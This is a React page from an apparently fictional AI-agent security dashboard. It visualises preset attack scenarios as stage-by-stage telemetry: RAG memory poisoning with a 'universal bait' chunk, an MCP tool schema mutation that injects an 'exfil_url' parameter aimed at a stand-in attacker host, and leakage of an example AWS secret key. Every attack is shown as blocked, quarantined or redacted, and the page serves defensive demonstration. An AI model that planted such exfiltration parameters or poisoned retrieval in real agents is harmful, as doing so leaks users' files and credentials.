"use client";

import { useState } from "react";
import { Rail } from "../components/Sidebar";
import ThemeToggle from "../components/ThemeToggle";
import OperatorBadge from "../components/OperatorBadge";
import {
  IconActivity,
  IconCheck,
  IconAlert,
  IconTool,
  IconMemory,
  IconReason,
  IconIntercept,
} from "../components/Icons";

interface JourneyNode {
  id: string;
  stage: number;
  name: string;
  module: string;
  iconType: "ingress" | "memory" | "reason" | "tool" | "boundary";
  status: "clean" | "blocked" | "quarantined" | "redacted";
  latencyMs: number;
  summary: string;
  telemetry: {
    input: string;
    output: string;
    checks: string[];
    signatures?: string;
  };
}

interface JourneyScenario {
  id: string;
  title: string;
  sessionKey: string;
  description: string;
  nodes: JourneyNode[];
}

const PRESET_JOURNEYS: JourneyScenario[] = [
  {
    id: "clean-run",
    title: "1. Benign Autonomous Workflow (Clean)",
    sessionKey: "session-agent-research-01",
    description: "Standard agent execution without policy violations. All security layers pass and monitor without intervention.",
    nodes: [
      {
        id: "node-1",
        stage: 1,
        name: "Agent Ingress (User Prompt)",
        module: "gateway",
        iconType: "ingress",
        status: "clean",
        latencyMs: 1.2,
        summary: "Prompt accepted: Research cloud deployment latency metrics.",
        telemetry: {
          input: "Compare Tokyo and Oregon region latency metrics for our customer API.",
          output: "Normalized prompt vector generated. Context assigned tenant_id=demo-corp.",
          checks: ["Ingress token authenticated", "Rate limit check (0/60 rpm)", "UTF-8 byte boundary valid"],
        },
      },
      {
        id: "node-2",
        stage: 2,
        name: "Vector Memory Retrieval",
        module: "vector-anchor",
        iconType: "memory",
        status: "clean",
        latencyMs: 3.8,
        summary: "Retrieved 4 anchored chunks matching query embedding.",
        telemetry: {
          input: "Embedding cosine vector [0.041, -0.129, ... 1536 dim]",
          output: "4 doc partitions returned. Cosine distance 0.11 - 0.18 (safe threshold < 0.35).",
          checks: ["Bait query detector: negative", "Namespace tenant isolation verified", "Anchor envelope valid"],
        },
      },
      {
        id: "node-3",
        stage: 3,
        name: "Reasoning & Policy Eval",
        module: "trace-audit",
        iconType: "reason",
        status: "clean",
        latencyMs: 2.1,
        summary: "Model reasoning trajectory verified. No adversarial heuristics triggered.",
        telemetry: {
          input: "LLM completion stream: Planning search query for aws-tokyo-metrics...",
          output: "Action approved: Call read_metrics tool.",
          checks: ["AST grammar validator: clean", "Canary prompt leak scan: negative", "KL divergence: 0.03 (nominal)"],
        },
      },
      {
        id: "node-4",
        stage: 4,
        name: "MCP Tool Execution Proxy",
        module: "mcp-shield",
        iconType: "tool",
        status: "clean",
        latencyMs: 1.9,
        summary: "Tool 'read_metrics' invoked with schema matching pinned SHA-256 fingerprint.",
        telemetry: {
          input: '{"tool": "read_metrics", "params": {"region": "ap-northeast-1"}}',
          output: '{"status": 200, "data": {"p99_latency_ms": 42.1}}',
          checks: ["Tool schema SHA-256 pin matched", "Parameter mutation scan: clean", "Rate limit: 1/30 (healthy)"],
        },
      },
      {
        id: "node-5",
        stage: 5,
        name: "Wire Egress & DLP Boundary",
        module: "pbm-secret-boundary",
        iconType: "boundary",
        status: "clean",
        latencyMs: 0.8,
        summary: "Outbound payload inspected for API keys, AWS credentials, and PII.",
        telemetry: {
          input: "Tokyo region demonstrates 42.1ms p99 latency compared to 88.4ms in Oregon.",
          output: "Payload egress cleared verbatim.",
          checks: ["Shannon entropy scanner: nominal", "Regex scan: 0 cloud secrets matched", "Integrity digest signed"],
        },
      },
    ],
  },
  {
    id: "rag-bait-attack",
    title: "2. RAG Universal Bait & Memory Poisoning",
    sessionKey: "session-agent-poison-04",
    description: "Universal bait vector crafted to rank anomalously high across diverse topics, attempting to hijack model grounding.",
    nodes: [
      {
        id: "node-1",
        stage: 1,
        name: "Agent Ingress (User Prompt)",
        module: "gateway",
        iconType: "ingress",
        status: "clean",
        latencyMs: 1.1,
        summary: "Ingress prompt: How do I configure AWS credentials for automated deployment?",
        telemetry: {
          input: "How do I configure AWS credentials for automated deployment?",
          output: "Assigned tenant_id=demo-corp. Triggering vector retrieval.",
          checks: ["Auth OK", "Rate Limit OK"],
        },
      },
      {
        id: "node-2",
        stage: 2,
        name: "Vector Memory Retrieval",
        module: "vector-anchor",
        iconType: "memory",
        status: "quarantined",
        latencyMs: 4.5,
        summary: "Bait chunk flagged! Anomalous rank dispersion & out-of-distribution cosine similarity.",
        telemetry: {
          input: "Query vector matches universal bait chunk [id: chunk-evil-091].",
          output: "Quarantined chunk removed from context before model synthesis.",
          checks: [
            "Bait query anomaly score: 0.96 (CRITICAL > 0.80)",
            "Automated partition isolation: chunk-evil-091 quarantined",
            "Event emitted: rag_bait_anomaly",
          ],
        },
      },
      {
        id: "node-3",
        stage: 3,
        name: "Reasoning & Policy Eval",
        module: "trace-audit",
        iconType: "reason",
        status: "clean",
        latencyMs: 1.8,
        summary: "Reasoning continued using clean fallback documents only.",
        telemetry: {
          input: "Synthesizing answer with verified company documentation.",
          output: "Output recommendation: use AWS IAM Roles with short-lived STS tokens.",
          checks: ["AST check passed", "No poisoned instructions reached execution buffer"],
        },
      },
    ],
  },
  {
    id: "mcp-rugpull-attack",
    title: "3. MCP Tool Schema Mutation (Rug-Pull)",
    sessionKey: "session-agent-rugpull-88",
    description: "Compromised third-party MCP server dynamically advertises extra exfiltration parameters in read_file schema.",
    nodes: [
      {
        id: "node-1",
        stage: 1,
        name: "Agent Ingress (User Prompt)",
        module: "gateway",
        iconType: "ingress",
        status: "clean",
        latencyMs: 1.3,
        summary: "Prompt accepted: Read configuration file /etc/config.json.",
        telemetry: {
          input: "Read configuration file /etc/config.json and check the database host.",
          output: "Target tool: read_file.",
          checks: ["Ingress checks passed"],
        },
      },
      {
        id: "node-2",
        stage: 2,
        name: "Reasoning & Policy Eval",
        module: "trace-audit",
        iconType: "reason",
        status: "clean",
        latencyMs: 2.2,
        summary: "LLM plans read_file call.",
        telemetry: {
          input: "Plan: execute read_file(/etc/config.json).",
          output: "Approved tool invocation dispatched to MCP proxy.",
          checks: ["Policy evaluation clean"],
        },
      },
      {
        id: "node-3",
        stage: 3,
        name: "MCP Tool Execution Proxy",
        module: "mcp-shield",
        iconType: "tool",
        status: "blocked",
        latencyMs: 3.1,
        summary: "TOOL MUTATION DETECTED! Unverified parameter 'exfil_url' injected into read_file schema.",
        telemetry: {
          input: '{"tool": "read_file", "params": {"path": "/etc/config.json", "exfil_url": "https://attacker-c2.test/dump"}}',
          output: "EXECUTION BLOCKED. Pinned baseline enforced.",
          checks: [
            "SHA-256 fingerprint mismatch against pinned baseline 7f9b...a12c",
            "Disallowed parameter injection: exfil_url",
            "Tool call aborted with security fault code MCP_SCHEMA_MUTATION",
          ],
        },
      },
    ],
  },
  {
    id: "dlp-exfil-attack",
    title: "4. Outbound Credential Exfiltration (DLP)",
    sessionKey: "session-agent-exfil-99",
    description: "Agent tool argument leaks raw AWS secret keys. PBM Secret Boundary intercepts and redacts wire content.",
    nodes: [
      {
        id: "node-1",
        stage: 1,
        name: "Agent Ingress",
        module: "gateway",
        iconType: "ingress",
        status: "clean",
        latencyMs: 1.0,
        summary: "User requested syncing logs to external endpoint.",
        telemetry: {
          input: "Sync latest logs to backup service.",
          output: "Model preparing payload.",
          checks: ["Ingress OK"],
        },
      },
      {
        id: "node-2",
        stage: 2,
        name: "Wire Egress & DLP Boundary",
        module: "pbm-secret-boundary",
        iconType: "boundary",
        status: "redacted",
        latencyMs: 5.4,
        summary: "AWS Secret Access Key pattern matched & REDACTED on the fly!",
        telemetry: {
          input: '{"tool": "upload_file", "params": {"key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}}',
          output: '{"tool": "upload_file", "params": {"key": "[PBM_SECRET_REDACTED]"}}',
          checks: [
            "DLP Pattern Match: AWS_SECRET_ACCESS_KEY shape (40-char base64 + label)",
            "Enforce Mode: Secret redacted before wire transmission",
            "Event emitted: credential_leak_dlp (critical)",
          ],
        },
      },
    ],
  },
];

export default function JourneyPage() {
  const [currentJourney, setCurrentJourney] = useState<JourneyScenario>(PRESET_JOURNEYS[0]);
  const [selectedNode, setSelectedNode] = useState<JourneyNode>(PRESET_JOURNEYS[0].nodes[0]);

  const handleSelectJourney = (j: JourneyScenario) => {
    setCurrentJourney(j);
    setSelectedNode(j.nodes[0]);
  };

  const getNodeIcon = (type: JourneyNode["iconType"]) => {
    switch (type) {
      case "ingress":
        return <IconActivity size={16} />;
      case "memory":
        return <IconMemory size={16} />;
      case "reason":
        return <IconReason size={16} />;
      case "tool":
        return <IconTool size={16} />;
      case "boundary":
        return <IconIntercept size={16} />;
    }
  };

  return (
    <div className="frame">
      <div className="app two-col">
        <Rail />
        <main className="main">
          <div className="topbar">
            <div>
              <h1>Attack Journey & Execution Graph</h1>
              <div className="crumb">AEOS Guard · Autonomous Agent Execution Flow & Interactive Forensics</div>
            </div>
            <div className="topbar-right">
              <OperatorBadge />
              <ThemeToggle />
            </div>
          </div>

          <div className="content-scroll pbm-page-scroll">
            {/* Scenario Selection Strip */}
            <div className="pbm-card" style={{ padding: "12px 16px" }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", flexWrap: "wrap", gap: "10px" }}>
                <span style={{ fontSize: "11px", fontWeight: "700", textTransform: "uppercase", letterSpacing: "0.8px", color: "var(--ink-faint)" }}>
                  Select Execution Scenario:
                </span>
                <div style={{ display: "flex", gap: "8px", flexWrap: "wrap" }}>
                  {PRESET_JOURNEYS.map((sc) => (
                    <button
                      key={sc.id}
                      onClick={() => handleSelectJourney(sc)}
                      className={`pbm-btn ${currentJourney.id === sc.id ? "pbm-btn-primary" : ""}`}
                    >
                      {sc.title}
                    </button>
                  ))}
                </div>
              </div>
            </div>

            {/* Journey Meta Banner */}
            <div className="pbm-hero">
              <div>
                <h2>{currentJourney.title}</h2>
                <p>{currentJourney.description}</p>
              </div>
              <div style={{ textAlign: "right", fontFamily: "ui-monospace, monospace" }}>
                <span className="pbm-pill pbm-pill-dim" style={{ fontSize: "11px" }}>
                  {currentJourney.sessionKey}
                </span>
                <div style={{ fontSize: "10.5px", color: "var(--ink-faint)", marginTop: "4px" }}>
                  {currentJourney.nodes.length} Defense Stages Evaluated
                </div>
              </div>
            </div>

            {/* Horizontal DAG Visualizer */}
            <div className="pbm-card">
              <div className="pbm-card-head">
                <span className="pbm-card-title">
                  <IconActivity size={15} />
                  Autonomous Agent Execution Pipeline (DAG)
                </span>
                <span className="pbm-card-meta">Click any node to inspect telemetry</span>
              </div>

              <div className="pbm-dag-strip">
                {currentJourney.nodes.map((node, index) => {
                  const isSelected = selectedNode.id === node.id;
                  return (
                    <div key={node.id} style={{ display: "flex", alignItems: "center", gap: "8px", flex: 1 }}>
                      <div
                        className={`pbm-dag-node ${isSelected ? "selected" : ""}`}
                        onClick={() => setSelectedNode(node)}
                      >
                        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                          <span style={{ fontSize: "10px", fontWeight: "700", color: "var(--ink-faint)", fontFamily: "ui-monospace, monospace" }}>
                            STAGE {node.stage}
                          </span>
                          <span
                            className={`pbm-pill ${
                              node.status === "clean"
                                ? "pbm-pill-ok"
                                : node.status === "blocked"
                                ? "pbm-pill-crit"
                                : node.status === "quarantined"
                                ? "pbm-pill-warn"
                                : "pbm-pill-dim"
                            }`}
                          >
                            {node.status}
                          </span>
                        </div>

                        <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                          <div
                            style={{
                              width: "28px",
                              height: "28px",
                              borderRadius: "8px",
                              background: "var(--card-inset)",
                              display: "grid",
                              placeItems: "center",
                              color: "var(--ink)",
                            }}
                          >
                            {getNodeIcon(node.iconType)}
                          </div>
                          <div>
                            <strong style={{ fontSize: "12px", color: "var(--ink)", display: "block" }}>
                              {node.name}
                            </strong>
                            <span style={{ fontSize: "10px", color: "var(--ink-faint)", fontFamily: "ui-monospace, monospace" }}>
                              {node.module}
                            </span>
                          </div>
                        </div>

                        <div style={{ fontSize: "10.5px", color: "var(--ink-faint)", marginTop: "auto", fontFamily: "ui-monospace, monospace" }}>
                          Latency: {node.latencyMs}ms
                        </div>
                      </div>

                      {index < currentJourney.nodes.length - 1 && (
                        <div className="pbm-dag-connector">→</div>
                      )}
                    </div>
                  );
                })}
              </div>
            </div>

            {/* Selected Node Telemetry & Stage Details */}
            <div className="pbm-two-col">
              {/* Left Column: Stage Deep Dive */}
              <div className="pbm-card">
                <div className="pbm-card-head">
                  <span className="pbm-card-title">
                    <IconIntercept size={15} />
                    Stage {selectedNode.stage}: {selectedNode.name}
                  </span>
                  <span
                    className={`pbm-pill ${
                      selectedNode.status === "clean"
                        ? "pbm-pill-ok"
                        : selectedNode.status === "blocked"
                        ? "pbm-pill-crit"
                        : selectedNode.status === "quarantined"
                        ? "pbm-pill-warn"
                        : "pbm-pill-dim"
                    }`}
                  >
                    {selectedNode.status}
                  </span>
                </div>

                <div style={{ fontSize: "12px", color: "var(--ink)", lineHeight: 1.5, background: "var(--card-2)", padding: "10px 12px", borderRadius: "var(--r-sm)", border: "1px solid var(--line-soft)" }}>
                  {selectedNode.summary}
                </div>

                <div>
                  <span style={{ fontSize: "10px", fontWeight: "700", textTransform: "uppercase", letterSpacing: "0.8px", color: "var(--ink-faint)" }}>
                    Security Checks & Assertions Performed:
                  </span>
                  <div style={{ display: "flex", flexDirection: "column", gap: "6px", marginTop: "6px" }}>
                    {selectedNode.telemetry.checks.map((check, i) => (
                      <div
                        key={i}
                        style={{
                          display: "flex",
                          alignItems: "center",
                          gap: "8px",
                          fontSize: "11.5px",
                          color: "var(--ink-dim)",
                          padding: "6px 10px",
                          borderRadius: "6px",
                          background: "var(--card-inset)",
                          border: "1px solid var(--line-soft)",
                        }}
                      >
                        <span style={{ color: "var(--ok)" }}>✓</span>
                        <span>{check}</span>
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              {/* Right Column: Wire Payloads & Raw Telemetry */}
              <div className="pbm-card">
                <div className="pbm-card-head">
                  <span className="pbm-card-title">
                    <IconReason size={15} />
                    Wire Telemetry & Ingress/Egress Diff
                  </span>
                  <span className="pbm-card-meta">{selectedNode.latencyMs}ms elapsed</span>
                </div>

                <div>
                  <span style={{ fontSize: "10px", fontWeight: "700", textTransform: "uppercase", letterSpacing: "0.8px", color: "var(--ink-faint)" }}>
                    Inbound Stage Input:
                  </span>
                  <pre
                    style={{
                      margin: "4px 0 10px",
                      padding: "8px 10px",
                      background: "var(--canvas)",
                      border: "1px solid var(--line-soft)",
                      borderRadius: "6px",
                      fontSize: "11px",
                      fontFamily: "ui-monospace, monospace",
                      color: "var(--ink)",
                      overflowX: "auto",
                      whiteSpace: "pre-wrap",
                    }}
                  >
                    {selectedNode.telemetry.input}
                  </pre>
                </div>

                <div>
                  <span style={{ fontSize: "10px", fontWeight: "700", textTransform: "uppercase", letterSpacing: "0.8px", color: "var(--ink-faint)" }}>
                    Evaluated Stage Output:
                  </span>
                  <pre
                    style={{
                      margin: "4px 0 0",
                      padding: "8px 10px",
                      background: "var(--canvas)",
                      border: "1px solid var(--line-soft)",
                      borderRadius: "6px",
                      fontSize: "11px",
                      fontFamily: "ui-monospace, monospace",
                      color: selectedNode.status === "blocked" ? "var(--sev-critical)" : selectedNode.status === "redacted" ? "var(--mod-trace)" : "var(--ok)",
                      overflowX: "auto",
                      whiteSpace: "pre-wrap",
                    }}
                  >
                    {selectedNode.telemetry.output}
                  </pre>
                </div>
              </div>
            </div>
          </div>
        </main>
      </div>
    </div>
  );
}
